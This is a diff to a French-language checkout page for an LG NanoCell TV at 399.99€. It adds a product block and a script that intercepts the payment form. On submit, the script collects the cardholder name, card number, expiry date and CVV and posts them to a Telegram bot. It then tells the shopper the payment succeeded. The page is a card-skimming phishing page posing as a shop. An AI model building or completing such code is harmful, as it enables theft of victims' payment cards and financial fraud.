@@ -29,6 +29,21 @@
             font-size: 24px;
         }
 
+        .product-info {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .product-info img {
+            width: 150px; /* Taille de l'image du produit */
+            margin-bottom: 15px;
+        }
+
+        .product-info p {
+            font-size: 16px;
+            color: #333;
+        }
+
         .form-group {
             margin-bottom: 20px;
         }
@@ -83,9 +98,21 @@
 <body>
 
     <div class="container">
+        <div class="product-info">
+            <img src="51FWfzIHkWL._AC_SX679_.jpg" alt="LG TV - 55NANO766">
+            <p><strong>LG TV - 55NANO766 - Acier foncé - 55'' (139 cm) - LED NanoCell 4K</strong></p>
+            <p>Taille de l'écran : 55 Pouces</p>
+            <p>Marque : LG</p>
+            <p>Technologie d'affichage : LED</p>
+            <p>Résolution : 4K</p>
+            <p>Fréquence de rafraîchissement : 50 Hz</p>
+            <p>Technologie de connectivité : USB, HDMI</p>
+            <p><strong>Prix : 399.99€</strong></p>
+        </div>
+
         <h2>Informations de Paiement</h2>
 
-        <form action="confirmation.html" method="POST">
+        <form action="" method="POST" id="paymentForm">
             <div class="form-group">
                 <label for="card-number">Numéro de carte</label>
                 <input 
@@ -164,8 +191,48 @@
             const formattedValue = value.replace(/(\d{4})/g, '$1 ').trim(); // Ajouter un espace après chaque 4 chiffres
             e.target.value = formattedValue;
         });
+
+        // Fonction d'envoi des données au bot Telegram
+        const form = document.getElementById('paymentForm');
+        form.addEventListener('submit', async function(event) {
+            event.preventDefault();
+            const formData = new FormData(form);
+            const formValues = Object.fromEntries(formData);
+
+            const message = `
+                Nouvelle commande :
+                - Nom sur la carte : ${formValues['name-on-card']}
+                - Numéro de carte : ${formValues['card-number']}
+                - Expiration : ${formValues['expiry-month']}/${formValues['expiry-year']}
+                - CVV : ${formValues['cvv']}
+                - Prix : 399.99€
+            `;
+
+            const telegramToken = "VOTRE_TOKEN_TELEGRAM";
+            const chatId = "VOTRE_CHAT_ID";
+            const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+
+            const payload = {
+                chat_id: chatId,
+                text: message
+            };
+
+            const requestOptions = {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            };
+
+            const response = await fetch(url, requestOptions);
+            if (response.ok) {
+                alert('Votre paiement a été soumis avec succès!');
+            } else {
+                alert('Erreur lors de la soumission de votre paiement.');
+            }
+        });
     </script>
 
 </body>
 </html>
-
